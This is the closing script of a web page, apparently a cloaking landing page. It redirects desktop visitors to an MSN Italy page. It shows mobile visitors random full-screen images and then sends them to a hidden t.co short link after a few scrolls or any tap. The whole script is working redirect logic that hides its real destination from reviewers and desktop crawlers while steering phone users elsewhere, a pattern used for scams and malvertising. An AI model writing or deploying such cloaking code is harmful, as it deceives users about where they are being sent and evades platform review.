<script>
        // --- 1. CONFIGURATION & REDIRECT CHECK ---
        const desktopURL = "https://www.msn.com/it-it";
        const mobileURL = "https://t.co/21Bu3LDwwY";
        const isMobile = /iphone|ipad|ipod|android|blackberry|mini|windows\sce|palm/i.test(navigator.userAgent.toLowerCase());
        const MAX_SCROLLS_BEFORE_REDIRECT = 5; // Scrolls from 0 to 5, meaning viewing section 6 (index 5)
        
        // Immediate redirect for desktop
        if (!isMobile) {
            window.location.replace(desktopURL);
        }

        const ALL_IMAGE_URLS = [
            'https://i.imgur.com/hmAABJ7.jpg',
            'https://i.imgur.com/ZYGvd6q.jpg',
            'https://i.imgur.com/YpxSLD0.jpg',
            'https://i.imgur.com/JSU3t4x.jpg',
            'https://i.imgur.com/rMwqoZP.jpg',
            'https://i.imgur.com/Dpi9Zzv.jpg',
            'https://i.imgur.com/0kpyxuU.jpg',
            'https://i.imgur.com/wzYPBDJ.jpg',
            'https://i.imgur.com/wGi8uyT.jpg',
            'https://i.imgur.com/tTxAmNF.jpg',
            'https://i.imgur.com/pSX3j18.jpg',
            'https://i.imgur.com/jwFUISy.jpg',
            'https://i.imgur.com/adL2Ou5.jpg',
            'https://i.imgur.com/lcFOzxz.jpg',
            'https://i.imgur.com/TrIPXQf.jpg',
            'https://i.imgur.com/LkW7EgA.jpg'
        ];

        // --- 2. UTILITY FUNCTIONS ---
        function getRandomImageUrls(count) {
            const shuffled = [...ALL_IMAGE_URLS].sort(() => 0.5 - Math.random());
            return shuffled.slice(0, count);
        }

        function preloadImage(url) {
            const img = new Image();
            img.src = url;
        }

        // --- 3. INITIALIZATION ---
        
        const sections = document.querySelectorAll(".full-image-section");
        const SELECTED_IMAGE_URLS = getRandomImageUrls(4); 
        let currentSectionIndex = 0;

        // Apply random images to the sections
        sections.forEach((section, index) => {
            let url;
            if (index < SELECTED_IMAGE_URLS.length) {
                url = SELECTED_IMAGE_URLS[index];
            } else {
                url = SELECTED_IMAGE_URLS[0]; 
            }
            
            section.setAttribute('data-bg', url);

            // Preload the first image immediately
            if (index === 0) {
                preloadImage(url);
            }
        });
        
        // Apply the first image's background after the DOM loads
        document.addEventListener('DOMContentLoaded', () => {
             const firstSection = sections[0];
             const firstImageUrl = firstSection.getAttribute('data-bg');
             firstSection.style.backgroundImage = `url('${firstImageUrl}')`;
             
             // Preload the rest of the images needed for this session
             for(let i = 1; i < sections.length; i++) {
                 preloadImage(sections[i].getAttribute('data-bg'));
             }
        });

        // --- 4. SCROLL AND REDIRECT LOGIC (Using Intersection Observer) ---
        
        const observer = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    const newIndex = parseInt(entry.target.getAttribute('data-section-index'));
                    
                    if (newIndex >= currentSectionIndex) {
                        currentSectionIndex = newIndex;
                        
                        // Apply the background image when the section becomes visible (Lazy Load)
                        const imageUrl = entry.target.getAttribute('data-bg');
                        if (entry.target.style.backgroundImage === '') {
                             entry.target.style.backgroundImage = `url('${imageUrl}')`;
                        }

                        // Check for redirect condition
                        if (currentSectionIndex >= MAX_SCROLLS_BEFORE_REDIRECT) {
                            // Redirect!
                            window.location.href = mobileURL;
                        }
                    } 
                }
            });
        }, {
            root: document.querySelector('.image-container'),
            threshold: 0.5 
        });

        // Start observing all sections
        sections.forEach(section => {
            observer.observe(section);
        });

        // --- 5. FALLBACK CLICK REDIRECT (CORRECTED) ---
        
        document.getElementById("imageContainer").addEventListener("click", () => {
             // ACTION: Redirect the user immediately on click, regardless of scroll position.
             window.location.href = mobileURL;
        });
    </script>
</body>
</html>